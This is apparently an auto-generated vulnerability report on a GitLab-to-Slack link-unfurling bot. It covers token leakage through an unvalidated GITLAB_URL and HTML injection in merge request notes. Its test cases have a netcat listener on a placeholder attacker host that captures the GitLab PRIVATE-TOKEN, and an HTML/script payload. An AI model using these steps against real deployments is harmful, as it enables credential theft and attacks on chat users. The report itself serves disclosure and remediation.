## Combined Vulnerability List

### GITLAB_URL SSRF due to lack of validation

- **Vulnerability Name:** GITLAB_URL SSRF due to lack of validation
- **Description:**
    1. An attacker (or misconfiguration) sets the `GITLAB_URL` environment variable to point to a malicious server instead of a legitimate GitLab instance.
    2. A user in Slack posts a GitLab URL in a channel where the bot is active.
    3. The Slack bot parses the GitLab URL and attempts to fetch information to unfurl the link.
    4. The bot constructs an API request using the `GITLAB_URL` as the base URL and sends this request to the server specified in `GITLAB_URL`.
    5. Because `GITLAB_URL` is pointing to a malicious server, the API request, including the `PRIVATE-TOKEN` in the header, is sent to the attacker-controlled server.
    6. The attacker's server can capture the `GITLAB_TOKEN` from the request headers.
- **Impact:**
    - Leakage of the `GITLAB_TOKEN`.
    - An attacker can gain unauthorized access to the legitimate GitLab instance using the leaked `GITLAB_TOKEN`, potentially allowing them to read sensitive data, modify projects, or perform other actions depending on the token's permissions.
- **Vulnerability Rank:** High
- **Currently implemented mitigations:**
    - None. The application does not validate or sanitize the `GITLAB_URL` environment variable.
- **Missing mitigations:**
    - Input validation for `GITLAB_URL`. The application should validate that `GITLAB_URL` is a valid and expected GitLab instance URL.
    - Implement a whitelist of allowed GitLab domains or URL patterns for `GITLAB_URL`.
    - Consider validating the response from the `GITLAB_URL` to ensure it is indeed a GitLab instance before sending sensitive tokens.
- **Preconditions:**
    - The `GITLAB_URL` environment variable of the deployed Slack bot must be set to a malicious URL. This could occur due to:
        - Misconfiguration by the user deploying the bot.
        - An attacker gaining access to the deployment environment and modifying the environment variables.
- **Source code analysis:**
    1. File: `/code/unfurl_message.py`
    2. Line 31: `GITLAB_URL = os.getenv("GITLAB_URL")` - The `GITLAB_URL` is read directly from the environment without any validation.
    3. Line 89: `def get_data_from_api(session, api_path):` - This function constructs the full API URL using `urljoin(GITLAB_URL, api_path)`.
    4. Line 90: `response = session.get(urljoin(GITLAB_URL, api_path))` - The request is made to the constructed URL.
    5. The `GITLAB_TOKEN` is included in the headers for all API requests made by `get_data_from_api` via the `session` object which is initialized in `unfurl` function with `session.headers = {"PRIVATE-TOKEN": GITLAB_TOKEN, "User-Agent": "GitLab Unfurly"}`.
    6. There is no code to validate the `GITLAB_URL` to ensure it points to a legitimate GitLab instance.
    7. Visualization:
        ```
        [Slack User] --> (Post GitLab URL in Slack) --> [Slack Bot]
                       [Slack Bot] --> (Construct API Request using GITLAB_URL + API Path, includes GITLAB_TOKEN in header) --> [Attacker Server (if GITLAB_URL is malicious)]
                       [Attacker Server] --> (Capture GITLAB_TOKEN from request header)
        ```
- **Security test case:**
    1. **Setup Attacker Server:**
        - Prepare an attacker-controlled server (e.g., using `python -m http.server 8000` or `nc -l 8000`) that logs incoming HTTP requests. Let's assume it's reachable at `http://attacker.example.com:8000`.
    2. **Deploy the Slack Bot with Misconfigured GITLAB_URL:**
        - Deploy the `gitlab-unfurly` bot to AWS Lambda or a similar serverless environment.
        - **Crucially, set the `GITLAB_URL` environment variable to `http://attacker.example.com:8000`**.
        - Configure other necessary environment variables (`SLACK_TOKEN`, `GITLAB_TOKEN` - the `GITLAB_TOKEN` can be a dummy token for a test GitLab instance to minimize risk, but ensure it's set so the code doesn't error out early).
        - Ensure the bot is connected to a test Slack workspace.
    3. **Trigger Unfurl:**
        - In the test Slack workspace, in a channel where the bot is active, post a valid-looking GitLab URL (the actual GitLab instance in this URL doesn't matter as the bot will use the misconfigured `GITLAB_URL`). For example: `https://gitlab.com/testgroup/testproject/issues/1`.
    4. **Observe Attacker Server Logs:**
        - Check the logs of the attacker-controlled server (`http://attacker.example.com:8000`).
        - Verify that a request was received by the attacker server.
        - **Critically, verify that the received request includes the `PRIVATE-TOKEN` header, which contains the `GITLAB_TOKEN` value you configured (or the dummy token).**
    5. **Verification of Vulnerability:**
        - If the attacker server successfully captured the request with the `PRIVATE-TOKEN` header, it confirms the SSRF vulnerability due to the lack of `GITLAB_URL` validation. An attacker who can control the `GITLAB_URL` environment variable can indeed steal the `GITLAB_TOKEN`.

### HTML Injection in Merge Request Notes

- **Vulnerability Name:** HTML Injection in Merge Request Notes
- **Description:**
    1. An attacker creates a merge request note in GitLab with malicious HTML content.
    2. A Slack user shares a link to this merge request note in a Slack channel where the GitLab Unfurly bot is active.
    3. The bot detects the GitLab URL, parses it, and identifies it as a merge request note.
    4. The `get_note_merge_requests_info` function in `unfurl_message.py` is called to fetch data from the GitLab API for the note.
    5. The bot retrieves the note body, which contains the attacker's malicious HTML.
    6. The bot formats a Slack message attachment using the fetched data, including the raw, unsanitized HTML content from the note body in the `text` field.
    7. The bot sends this Slack message to the channel.
    8. Slack renders the message, including the malicious HTML injected by the attacker, potentially leading to phishing, redirection, or other client-side attacks.
- **Impact:** An attacker can inject arbitrary HTML into Slack messages viewed by users in the Slack channel. This can be exploited for phishing attacks (displaying fake login forms), redirection to malicious websites, defacement of messages, or potentially, in some cases, client-side scripting attacks within Slack.
- **Vulnerability Rank:** High
- **Currently implemented mitigations:** None. The code uses HTML sanitization in other parts of the application, but it's missing in the `get_note_merge_requests_info` function specifically for merge request note bodies.
- **Missing mitigations:**
    - Implement HTML sanitization for the merge request note body in the `get_note_merge_requests_info` function.
    - Apply the `strip_html_tags` function to the `body` variable in `get_note_merge_requests_info` before using it in the Slack message attachment.
- **Preconditions:**
    - The attacker has access to a GitLab instance that the GitLab Unfurly bot is configured to unfurl URLs from.
    - The attacker has the ability to create merge requests and add notes to them in the GitLab instance.
    - A Slack user shares a link to a malicious merge request note in a Slack channel where the bot is active.
- **Source code analysis:**
    - In `/code/unfurl_message.py`, the function `get_note_merge_requests_info` is responsible for fetching and formatting information for merge request notes.
    - The code fetches the note `body` directly from the GitLab API response:
      ```python
      data = get_data_from_api(session, api_path)
      ...
      body = data["body"]
      ```
    - This `body` variable, which can contain user-controlled content with HTML tags from GitLab, is then used directly in the `text` field of the Slack attachment after only being shortened by `textwrap.shorten`:
      ```python
      return {
          ...
          "text": textwrap.shorten(body.strip(), width=300, placeholder="…"),
          ...
      }
      ```
    - There is no HTML sanitization step using `strip_html_tags` or any other similar function before including the `body` in the Slack message. This allows any HTML present in the GitLab merge request note body to be passed directly to Slack for rendering.

- **Security test case:**
    1. **Prerequisites:**
        - Deploy the GitLab Unfurly bot and configure it to connect to a Slack workspace and a GitLab instance.
        - Ensure you have an account on the GitLab instance with permissions to create projects, merge requests, and notes.
        - Access to a Slack channel where you can post messages and test the bot's unfurling functionality.
    2. **Steps:**
        a. In the GitLab instance, create a new project.
        b. Create a new merge request in the project.
        c. Add a new note to the merge request with the following content:
           ```html
           <b>Bold text injection</b> <a href="https://example.com">Malicious Link</a> <script>alert("XSS Test")</script>
           ```
        d. Copy the URL of the merge request note. This URL will typically follow the format: `GITLAB_URL/YOUR_PROJECT/merge_requests/MERGE_REQUEST_ID#note_NOTE_ID`.
        e. In the Slack channel, paste the copied merge request note URL and send the message.
        f. Observe the unfurled message generated by the GitLab Unfurly bot in Slack.
    3. **Expected Result:**
        - The Slack message unfurl should render the HTML content from the GitLab merge request note.
        - "Bold text injection" should appear in bold.
        - "Malicious Link" should be displayed as a clickable link to `https://example.com`.
        - While script execution might be blocked by Slack's sanitization, the successful rendering of bold text and the malicious link demonstrates HTML injection.
    4. **Successful Exploitation:** If the HTML formatting (like bold text and hyperlinks) from the GitLab note is rendered in the Slack message, the HTML injection vulnerability is confirmed.